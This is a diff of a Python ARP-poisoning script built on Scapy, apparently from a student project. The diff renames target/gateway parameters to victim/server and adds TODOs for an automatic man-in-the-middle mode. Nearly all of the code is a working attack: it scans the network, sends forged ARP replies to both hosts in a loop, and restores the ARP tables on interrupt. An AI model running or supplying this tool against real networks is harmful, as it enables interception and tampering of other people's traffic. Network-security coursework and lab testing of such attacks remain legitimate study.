@@ -2,13 +2,16 @@ import scapy.all as sc;
 import argparse;
 import time;
 
+# TODO:
+# - Mitm optie maken die je automatisch mitm maakt
+# - Silent vs All out options
 
 ### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
 
 # Example run code that should do something, where x is ip range: 
 # python ARPpoisoning.py --scan x 
-# When specific target and gateway are found, where y and z are ip adresses: 
-# python ARPpoisoning.py --target y --gateway z
+# When specific victim and server are found, where y and z are ip adresses: 
+# python ARPpoisoning.py --victim y --server z
 
 
 ## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
@@ -30,8 +33,8 @@ def network_scan(ip):
 # 3. we need to stop the attack in a proper way.
 
 # (1.) Start the poisoning attack by sending fake ARP replies.
-def poison(target_ip, poison_ip, target_mac):
-    fake_packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poison_ip)
+def poison(victim_ip, poison_ip, victim_mac):
+    fake_packet = sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=poison_ip)
     sc.send(fake_packet, verbose=False)
 
 # (2.) Get the MAC adress of a given IP adress
@@ -47,30 +50,30 @@ def get_mac(ip):
     return None
 
 # (3.) Sends real ARP replies to stop and clean up the attack.
-def stop_attack(target_ip, real_ip, target_mac, real_mac):
-    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
+def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
+    packet = sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
     sc.send(packet, count=4, verbose=False)
 
 ## Now to start the attack, keep it goining, and stop it when we want.
-# We try to keep the ARP table of the target poisoned by sending packets in a loop.
-def arp_poison_loop(target_ip, gateway_ip):
+# We try to keep the ARP table of the victim poisoned by sending packets in a loop.
+def arp_poison_loop(victim_ip, server_ip):
     try:
-        target_mac = get_mac(target_ip)
-        gateway_mac = get_mac(gateway_ip)
+        victim_mac = get_mac(victim_ip)
+        server_mac = get_mac(server_ip)
         # Start loop
         while True:
-            poison(target_ip, gateway_ip, target_mac)
-            poison(gateway_ip, target_ip, gateway_mac)
+            poison(victim_ip, server_ip, victim_mac)
+            poison(server_ip, victim_ip, server_mac)
             time.sleep(2)
     except KeyboardInterrupt:
-        stop_attack(target_ip, gateway_ip, target_mac, gateway_mac)
-        stop_attack(gateway_ip, target_ip, gateway_mac, target_mac)
+        stop_attack(victim_ip, server_ip, victim_mac, server_mac)
+        stop_attack(server_ip, victim_ip, server_mac, victim_mac)
 
 ## Now that everything is set up, we want to make it easier to use this.
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ARP poisoning tool")
-    parser.add_argument("--target", help="Target IP adress")
-    parser.add_argument("--gateway", help="Gateway IP adress")
+    parser.add_argument("--victim", help="Victim IP adress")
+    parser.add_argument("--server", help="Server IP adress")
     parser.add_argument("--scan", help="Network IP range to scan", default=None)
     # Let the user input become variables
     args = parser.parse_args()
@@ -80,9 +83,9 @@ if __name__ == "__main__":
         print("Found hosts:")
         for host in hosts:
             print(f"{host['ip']} - {host['mac']}")
-    # if a target and gateway are given, start the spoofing attack
-    elif args.target and args.gateway:
-        arp_poison_loop(args.target, args.gateway)
+    # if a victim and server are given, start the spoofing attack
+    elif args.victim and args.server:
+        arp_poison_loop(args.victim, args.server)
     # if wrong input was given, give help
     else:
         parser.print_help()
